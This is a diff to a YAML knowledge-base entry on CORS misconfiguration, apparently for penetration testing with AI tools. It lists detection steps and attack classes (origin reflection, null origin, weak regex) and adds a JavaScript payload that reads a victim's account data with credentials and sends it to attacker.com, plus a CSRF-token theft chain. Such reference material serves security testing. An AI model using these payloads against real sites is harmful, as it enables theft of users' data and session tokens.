@@ -1,20 +1,66 @@
 id: CORS
-name: CORS Misconfiguration
+name: CORS Misconfiguration — Comprehensive
 cwe:
 - CWE-942
-owasp: A01:2021 Broken Access Control
+- CWE-346
+owasp: A05:2021 Security Misconfiguration
 severity_range: Medium - High
-description: Overly permissive CORS policy allows attacker-controlled websites to read responses from the target API.
+description: Misconfigured CORS headers allow malicious sites to read responses from the target with the victim's credentials,
+  enabling data theft and CSRF-like attacks.
 detection:
   strategy:
-  - '1. Send request with Origin: https://evil.com header'
-  - 2. Check if Access-Control-Allow-Origin reflects the evil origin
-  - '3. Check if Access-Control-Allow-Credentials: true is set'
-  - '4. Test with Origin: null'
-  - '5. Test with subdomain patterns: https://evil.target.com'
-  - '6. Test with prefix/suffix: https://target.com.evil.com'
-  - 7. Check preflight (OPTIONS) responses for overly permissive headers
-evidence_needed: Server reflects arbitrary Origin with credentials allowed, or allows null origin with credentials
+  - '1. Send request with Origin: https://attacker.com'
+  - 2. Check Access-Control-Allow-Origin in response
+  - 3. Check Access-Control-Allow-Credentials
+  - '4. If ACAO reflects attacker origin AND ACAC: true → exploitable'
+  attack_classes:
+    wildcard_with_credentials:
+      description: 'Both ACAO: * and ACAC: true (browser refuses, but some libs misimplement).'
+      severity: medium
+    origin_reflection:
+      description: Server reflects any Origin in ACAO header.
+      exploitation:
+      - 'Request with Origin: https://attacker.com'
+      - 'Response: Access-Control-Allow-Origin: https://attacker.com'
+      - Credentials sent — full data theft
+      severity: high
+    null_origin:
+      description: 'ACAO: null accepted (sandboxed iframes have origin null).'
+      exploitation:
+      - Embed attack in <iframe sandbox='allow-scripts'>
+      - Origin becomes null, gets accepted
+      severity: high
+    subdomain_takeover_cors:
+      description: ACAO allows *.target.com — taking over a subdomain enables attacks.
+      severity: high
+    trusted_subdomain_xss:
+      description: Whitelisted subdomain has XSS — chain XSS + CORS for full impact.
+      severity: high
+    weak_regex_acao:
+      description: Regex like ^.*\.target\.com$ matches attacker-target.com.
+      exploitation:
+      - Register attacker-target.com (or similar)
+      - Server thinks it's a subdomain, allows CORS
+      severity: high
+    scheme_confusion:
+      description: https://target.com whitelisted but http://target.com also accepted.
+      severity: medium
+exploitation:
+  data_exfiltration: "<script>\nfetch('https://target.com/api/account', {credentials: 'include'})\n  .then(r => r.text())\n\
+    \  .then(data => fetch('https://attacker.com/log?d=' + btoa(data)))\n</script>"
+  csrf_token_theft: "fetch('https://target.com/api/csrf-token', {credentials: 'include'})\n  .then(r => r.json())\n  .then(token\
+    \ => fetch('https://target.com/api/transfer', {\n    method: 'POST',\n    headers: {'X-CSRF-Token': token.value},\n  \
+    \  credentials: 'include',\n    body: '...'\n  }))"
+ai_research_hints:
+- Check both /api/* and /graphql for separate CORS configs
+- Internal endpoints (/admin, /internal) sometimes have weaker CORS than public APIs
+- WebSocket Origin checks are separate from HTTP CORS
+- Test with preflight too — OPTIONS responses sometimes leak ACAO when GET doesn't
+- Single-page apps often expose XHR endpoints designed for the same origin only
+tools:
+- CORS Scanner
+- Burp Active Scan
+- CORSer
 references:
 - https://portswigger.net/web-security/cors
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
+- https://book.hacktricks.xyz/pentesting-web/cors-bypass
